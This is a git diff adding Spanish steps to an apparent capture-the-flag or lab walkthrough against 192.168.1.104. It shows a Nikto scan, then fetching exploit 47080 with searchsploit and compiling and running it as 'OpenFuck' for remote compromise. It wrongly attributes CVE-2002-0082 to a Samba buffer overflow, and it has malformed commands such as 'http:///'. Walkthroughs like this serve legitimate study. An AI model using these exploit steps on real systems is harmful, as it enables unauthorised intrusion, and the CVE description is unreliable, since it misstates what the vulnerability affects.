@@ -39,3 +39,30 @@ nmap -p 22,80,111,139,443 -A 192.168.1.104
 Servidor corriendo: **HTTP Apache** (puerto 80 y 443)
 
 O.S: **Linux**
+
+URL: `http://192.168.1.104`
+
+![5](https://user-images.githubusercontent.com/75953873/177677946-e9cfd943-0c77-44a3-991c-c2d5a0377648.png)
+
+- *Paso 4:* Escanear vulnerabilidades en el servidor con Nikto. 
+```
+nikto -h http:///192.168.1.104
+```
+![6](https://user-images.githubusercontent.com/75953873/177678387-f0e381c3-874c-4919-b910-15f9fd2e5de6.png)
+
+Vulnerabilidad **CVE-2002-0082**: permite que un atacante explote el desbordamiento de búfer que se encuentra en las versiones de Samba 2.2.0 a 2.2.8.
+
+- https://www.cvedetails.com/cve/CVE-2002-0082/
+
+- *Paso 5:* Localizar exploti, descargarlo, compilarlo y ejecutarlo. 
+```
+searchsploit -m 47080
+```
+![8](https://user-images.githubusercontent.com/75953873/177683169-2b356aea-a453-4d46-9e64-6bf3a0906d15.png)
+
+```
+mv 47080.c OpenFuck.c
+gcc -o OpenFuck OpenFuck.c -lcrypto
+./OpenFuck 0x6b 192.168.1.104
+```
+![7](https://user-images.githubusercontent.com/75953873/177683272-6f97282a-31d1-46be-94c9-3020f0e959be.png)
